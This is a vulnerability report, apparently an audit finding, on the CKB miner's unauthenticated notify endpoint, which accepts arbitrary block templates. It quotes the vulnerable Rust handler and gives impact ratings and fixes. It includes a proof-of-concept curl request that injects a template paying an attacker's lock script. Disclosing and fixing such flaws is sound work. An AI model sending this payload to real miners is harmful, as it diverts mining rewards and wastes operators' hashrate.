### Title
Unauthenticated HTTP Endpoint Accepts Arbitrary JSON Block Templates Without Validation - (`File: miner/src/client.rs`)

### Summary
The CKB miner client, when configured in "notify mode," opens an HTTP server that accepts incoming `BlockTemplate` JSON payloads from any connecting host without authentication or source validation. The `handle` function at line 358–369 of `miner/src/client.rs` parses the raw HTTP body directly into a `BlockTemplate` and immediately acts on it by calling `update_block_template`, which queues the template as new mining work. Any unprivileged network peer that can reach the miner's listen port can inject a crafted block template and redirect the miner's PoW effort to an attacker-controlled block.

### Finding Description

The miner supports a "notify mode" where the CKB node's block assembler POSTs new `BlockTemplate` JSON to a configured URL (the miner's own HTTP listener). The miner's `listen_block_template_notify` function binds a TCP listener and dispatches every incoming HTTP request to the `handle` function:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
``` [1](#0-0) 

There is no authentication check, no IP allowlist enforcement, no HMAC/token verification, and no validation that the parsed `BlockTemplate` fields are consistent with the canonical chain (e.g., correct `parent_hash`, valid `compact_target`, matching epoch). The `if let Ok(template)` pattern silently discards parse errors and accepts any structurally valid JSON that deserializes into `BlockTemplate`.

The miner's listen address is configured via `ClientConfig.listen: Option<SocketAddr>`: [2](#0-1) 

The default template shows `listen = "127.0.0.1:8888"` as a commented-out example, but operators commonly bind to `0.0.0.0` or expose the port through NAT/firewall rules. Once `update_block_template` is called with the attacker's template, the miner immediately converts it to a `Work` unit and sends it to all worker threads: [3](#0-2) 

The legitimate node-side push path (`BlockAssembler::notify`) serializes the real template and POSTs it to the same endpoint: [4](#0-3) 

Because the miner's HTTP handler is indistinguishable from the node's push, an attacker who sends a well-formed `BlockTemplate` JSON first wins the race and redirects mining work.

### Impact Explanation

An attacker who can reach the miner's notify port can:

1. **Redirect PoW work** — inject a `BlockTemplate` with an attacker-controlled `cellbase` output (different lock script / coinbase address), causing the miner to solve PoW for a block that pays the attacker.
2. **Stall mining** — inject a template with a `work_id` that matches the current `current_work_id`, causing `fetch_update` to return `Err` and drop the legitimate template, halting block submission until the next poll cycle.
3. **Fork/orphan induction** — inject a template with a stale `parent_hash` or incorrect `compact_target`, causing the miner to submit an invalid block that is rejected by the network, wasting hashrate.

Impact: **4/5** — direct financial loss (stolen coinbase) and hashrate waste for any miner running in notify mode with a reachable listen port.

### Likelihood Explanation

Likelihood: **2/5** — requires the attacker to reach the miner's HTTP listen port. In many deployments the miner and node run on the same host or LAN, and the port is not exposed to the internet. However, operators who misconfigure the bind address (`0.0.0.0`) or expose it through port forwarding are fully vulnerable with zero authentication required.

### Recommendation

1. Bind the notify listener exclusively to `127.0.0.1` by default and document this as a security requirement.
2. Add a shared secret / bearer token that the CKB node includes in the `Authorization` header when POSTing templates, and reject requests that lack it.
3. Validate the received `BlockTemplate` against the local node's known tip (`parent_hash`, `compact_target`, `epoch`) before accepting it as work.
4. Log and reject (with a non-200 response) any request that fails deserialization rather than silently discarding it.

### Proof of Concept

```bash
# Attacker sends a crafted BlockTemplate to the miner's notify port,
# replacing the coinbase lock with an attacker-controlled address.
curl -X POST http://<miner-listen-addr>:8888/ \
  -H "Content-Type: application/json" \
  -d '{
    "version": "0x0",
    "compact_target": "0x1e083126",
    "current_time": "0x174c45e17a3",
    "number": "0x401",
    "epoch": "0x7080019000001",
    "parent_hash": "0xa5f5c85987a15de25661e5a214f2c1449cd803f071acc7999820f25246471f40",
    "cycles_limit": "0xd09dc300",
    "bytes_limit": "0x91c08",
    "uncles_count_limit": "0x2",
    "uncles": [],
    "transactions": [],
    "proposals": [],
    "cellbase": {
      "cycles": null,
      "data": {
        "version": "0x0",
        "cell_deps": [],
        "header_deps": [],
        "inputs": [{"previous_output": {"tx_hash": "0x0000000000000000000000000000000000000000000000000000000000000000","index": "0xffffffff"},"since": "0x401"}],
        "outputs": [{"capacity": "0x18e64efc04","lock": {"code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8","hash_type": "type","args": "0xATTACKER_LOCK_ARG_HERE"},"type": null}],
        "outputs_data": ["0x"],
        "witnesses": ["0x"]
      },
      "hash": "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
    },
    "work_id": "0x1",
    "dao": "0xd495a106684401001e47c0ae1d5930009449d26e32380000000721efd0030000"
  }'
# The miner will immediately begin solving PoW for this attacker-controlled block.
```

The `handle` function accepts this payload without any authentication or chain-state cross-check, calls `update_block_template`, and the worker threads begin mining the attacker's block. [1](#0-0) [5](#0-4)

### Citations

**File:** miner/src/client.rs (L234-271)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
            tokio::select! {
                conn = listener.accept() => {
                    let (stream, _) = match conn {
                        Ok(conn) => conn,
                        Err(e) => {
                            info!("accept error: {}", e);
                            tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                            continue;
                        }
                    };
                    let stream = hyper_util::rt::TokioIo::new(Box::pin(stream));
                    let conn = server.serve_connection_with_upgrades(stream, handle);

                    let conn = graceful.watch(conn.into_owned());
                    tokio::spawn(async move {
                        if let Err(err) = conn.await {
                            info!("connection error: {}", err);
                        }
                    });
                },
                _ = stop_rx.cancelled() => {
                    info!("Miner client received exit signal. Exit now");
                    break;
                }
            }
        }
        drop(listener);
        graceful.shutdown().await;
    }
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** util/app-config/src/configs/miner.rs (L19-30)
```rust
pub struct ClientConfig {
    /// CKB node RPC endpoint.
    pub rpc_url: String,
    /// The poll interval in seconds to get work from the CKB node.
    pub poll_interval: u64,
    /// By default, miner submits a block and continues to get the next work.
    ///
    /// When this is enabled, miner will block until the submission RPC returns.
    pub block_on_submit: bool,
    /// listen block_template notify instead of loop poll
    pub listen: Option<SocketAddr>,
}
```

**File:** tx-pool/src/block_assembler/mod.rs (L683-711)
```rust
    pub(crate) async fn notify(&self) {
        if !self.need_to_notify() {
            return;
        }
        let template = self.get_current().await;
        if let Ok(template_json) = serde_json::to_string(&template) {
            let notify_timeout = Duration::from_millis(self.config.notify_timeout_millis);
            for url in &self.config.notify {
                if let Ok(req) = Request::builder()
                    .method(Method::POST)
                    .uri(url.as_ref())
                    .header("content-type", "application/json")
                    .body(Full::new(template_json.to_owned().into()))
                {
                    let client = Arc::clone(&self.poster);
                    let url = url.to_owned();
                    tokio::spawn(async move {
                        let _resp =
                            timeout(notify_timeout, client.request(req))
                                .await
                                .map_err(|_| {
                                    ckb_logger::warn!(
                                        "block assembler notifying {} timed out",
                                        url
                                    );
                                });
                    });
                }
            }
```
